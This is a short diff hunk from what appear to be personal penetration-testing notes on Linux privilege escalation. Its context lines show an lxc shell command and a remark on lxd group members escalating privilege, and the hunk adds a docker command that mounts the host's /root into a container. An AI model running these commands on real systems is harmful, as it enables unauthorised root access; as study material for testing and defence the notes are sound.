@@ -255,7 +255,7 @@ $ lxc exec r00t /bin/sh
 %% if you are a member of lxd after using id command you can follow these steps to escalate your privilege and spawn a shell in the container instance %%
 
 ```
-$ 
+$ docker run -v /root:/mnt -it ubuntu
 ```
 
 
